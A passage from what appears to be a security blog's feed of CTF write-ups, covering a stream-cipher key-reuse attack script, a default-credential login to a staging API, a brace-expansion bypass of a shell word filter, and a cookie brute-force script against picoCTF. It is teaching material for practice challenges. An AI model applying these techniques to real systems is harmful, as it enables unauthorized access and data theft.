			&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;indexOfChar, char &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;enumerate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ciphertext.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ciphertext2.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;: &lt;span class=&quot;c&quot;&gt;# Xor the two ciphertexts&lt;/span&gt;
				&lt;span class=&quot;c&quot;&gt;# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&apos;t know which one)&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;string.printable and char.isalpha&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;: counter[indexOfChar] +&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1 &lt;span class=&quot;c&quot;&gt;# Increment the counter at this index&lt;/span&gt;
	knownSpaceIndexes &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;

	&lt;span class=&quot;c&quot;&gt;# Loop through all positions where a space character was possible in the current_index cipher&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;ind, val &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;counter.items&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
		&lt;span class=&quot;c&quot;&gt;# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;val &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 7: knownSpaceIndexes.append&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ind&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;#print knownSpaceIndexes # Shows all the positions where we now know the key!&lt;/span&gt;

	&lt;span class=&quot;c&quot;&gt;# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!&lt;/span&gt;
	xor_with_spaces &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ciphertext.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;150&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;index &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;knownSpaceIndexes:
		&lt;span class=&quot;c&quot;&gt;# Store the key&apos;s value at the correct position&lt;/span&gt;
		final_key[index] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; xor_with_spaces[index].encode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;c&quot;&gt;# Record that we known the key at this position&lt;/span&gt;
		known_key_positions.add&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;index&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Construct a hex key from the currently known key, adding in &apos;00&apos; hex chars where we do not know (to make a complete hex string)&lt;/span&gt;
final_key_hex &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;val &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;val is not None &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;00&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;val &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;final_key]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Xor the currently known key with the target cipher&lt;/span&gt;
output &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;target_cipher.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,final_key_hex.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Print the output, printing a * if that character is not known yet&lt;/span&gt;
print &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;index &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;known_key_positions &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;*&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;index, char &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;enumerate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;output&lt;span class=&quot;o&quot;&gt;)])&lt;/span&gt;

&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
Manual step
&apos;&apos;&apos;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# From the output this prints, we can manually complete the target plaintext from:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The secuet-mes*age*is: Wh** usi|g **str*am cipher, nev***use th* k*y *ore than onc*&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# to:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The secret message is: When using a stream cipher, never use the key more than once&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# We then confirm this is correct by producing the key from this, and decrpyting all the other messages to ensure they make grammatical sense&lt;/span&gt;
target_plaintext &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;b76a3dd6b1f523209cd9c0a11b}&quot;&lt;/span&gt;
print target_plaintext
key &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;target_cipher.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,target_plaintext&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cipher &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;ciphers:
	print strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cipher.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By running the script, we can partially obtain the flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python2 attack.py                                                                                                                                                                     1 ⨯
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;g&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;927&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;cdb7&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;a3&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;d6b1f5&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;209cd9c0&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;b&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Keep rotating the cipher texts (c1,c2,c3,c4,c5 …). After a few times, we should be able to recover all parts of the flag.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="cryptography" /><category term="ctf" /><category term="challenge" /><summary type="html">Description</summary></entry><entry><title type="html">Swaggy - H@acktivityCon 2021</title><link href="https://jayngng.github.io/blog/swaggy-hacktivitycon-2021/" rel="alternate" type="text/html" title="Swaggy - H@acktivityCon 2021" /><published>2021-09-17T18:18:05+10:00</published><updated>2021-09-17T18:18:05+10:00</updated><id>https://jayngng.github.io/blog/swaggy---hacktivitycon-2021</id><content type="html" xml:base="https://jayngng.github.io/blog/swaggy-hacktivitycon-2021/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; @congon4tor#2334&lt;/p&gt;

&lt;p&gt;This API documentation has all the swag&lt;/p&gt;

&lt;p&gt;Press the Start button on the top-right to begin this challenge.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Connect with:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    http://challenge.ctf.games:32286
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Navigating to the website, there are two available servers:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API&lt;/code&gt; … (unavailable).&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Staging-API&lt;/code&gt; …&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/Swaggy/servers.png&quot; title=&quot;Swaggy/servers.png&quot; alt=&quot;Swaggy/servers.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;We are particularly interested in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Staging-API&lt;/code&gt; one.&lt;/p&gt;

&lt;p&gt;To test the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Staging-API&lt;/code&gt; server and obtain the flag, we need to first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorize&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorize&lt;/code&gt; → Try &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; credentials.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/Swaggy/authorize.png&quot; title=&quot;Swaggy/authorize.png&quot; alt=&quot;Swaggy/authorize.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;After successfully logged in as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; user. We then execute the following command to retain the flag:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;GET&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&apos;http://staging-api.congon4tor.com:7777/flag&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;accept: application/json&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Authorization: Basic YWRtaW46YWRtaW4=&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;flag{e04f962[*REDACTED*]bf1dcdd3}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><category term="web" /><category term="challenge" /><summary type="html">Description</summary></entry><entry><title type="html">Bad Words - H@cktivityCon 2021</title><link href="https://jayngng.github.io/blog/bad-words-hcktivitycon-2021-ctf/" rel="alternate" type="text/html" title="Bad Words - H@cktivityCon 2021" /><published>2021-09-16T17:57:21+10:00</published><updated>2021-09-16T17:57:21+10:00</updated><id>https://jayngng.github.io/blog/bad-words---hcktivitycon-2021-ctf</id><content type="html" xml:base="https://jayngng.github.io/blog/bad-words-hcktivitycon-2021-ctf/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; @JohnHammond#6971&lt;/p&gt;

&lt;p&gt;You look questionable… if you don’t have anything good to say, don’t say anything at all!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Connect with:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc challenge.ctf.games 32559
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let’s us connect to the challenge.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc challenge.ctf.games 32559
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;You said a bad word, &lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;
user@host:/home/user&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the output, we notice that every ‘normal’ bash command is a bad word. Now, we need to bypass this.&lt;/p&gt;

&lt;p&gt;There are heaps of ways to achieve the goal. That said, we can use the following format …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;,&amp;lt;arguments&amp;gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;,-al&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;,-al&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
total 32
dr-xr-xr-x 1 nobody nogroup  4096 Sep  9 19:47 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 1 user   user     4096 Sep  9 19:47 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 nobody nogroup   220 Sep  9 19:47 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 user   user    12283 Sep  9 19:47 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 nobody nogroup   807 Sep  9 19:47 .profile
drwxr-xr-x 1 user   user     4096 Sep  9 19:47 just
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, let’s us navigate to the flag utilizing the same technique …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;,-al,just/out/of/reach&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;,-al,just/out/of/reach&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
total 12
drwxr-xr-x 1 user user 4096 Sep  9 19:47 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 1 user user 4096 Sep  9 19:47 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 user user   38 Sep  9 19:47 flag.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and we can easily read the flag …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;,just/out/of/reach/flag.txt&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;,just/out/of/reach/flag.txt&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;2d43e30[&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;REDACTED&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;7a9cbbe98&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ctf" /><category term="challenge" /><category term="miscellaneous" /><summary type="html">Description</summary></entry><entry><title type="html">Cookies - PicoCTF</title><link href="https://jayngng.github.io/blog/cookies-picoctf/" rel="alternate" type="text/html" title="Cookies - PicoCTF" /><published>2021-09-15T19:10:52+10:00</published><updated>2021-09-15T19:10:52+10:00</updated><id>https://jayngng.github.io/blog/cookies---picoctf</id><content type="html" xml:base="https://jayngng.github.io/blog/cookies-picoctf/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; madStacks&lt;/p&gt;

&lt;p&gt;Who doesn’t love cookies? Try to figure out the best one.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://mercury.picoctf.net:54219
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let’s us enumerate the target website by sending a random word for the cookie input.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/cookies/cookie1.png&quot; title=&quot;cookies/cookie1.png&quot; alt=&quot;cookies/cookie1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;→ The output returns an invalid cookie.&lt;/p&gt;

&lt;p&gt;Now, let’s us inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Storage&lt;/code&gt; tab of the Developer Tool, where cookies are stored.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/cookies/dev_cookie.png&quot; title=&quot;cookies/dev_cookie.png&quot; alt=&quot;cookies/dev_cookie.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt;, what if we modify the value to a positive number?! …&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/cookies/valid_cookie.png&quot; title=&quot;cookies/valid_cookie.png&quot; alt=&quot;cookies/valid_cookie.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;By modifying value, we successfull pull a random cookie from the website. To effectively enumerate the flag, we use the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; script.&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://mercury.picoctf.net:54219/check&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;picoCTF{&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying cookie: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Primarily, the script will detect a “weird” cookie (flag) for us.&lt;/p&gt;

&lt;p&gt;On our terminal, we execute …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 cookie_brute.py
Trying cookie: 0
Trying cookie: 1
Trying cookie: 2
...
picoCTF&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;3v3ry1_l0v3s_c00k135_96cdadfd&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
...
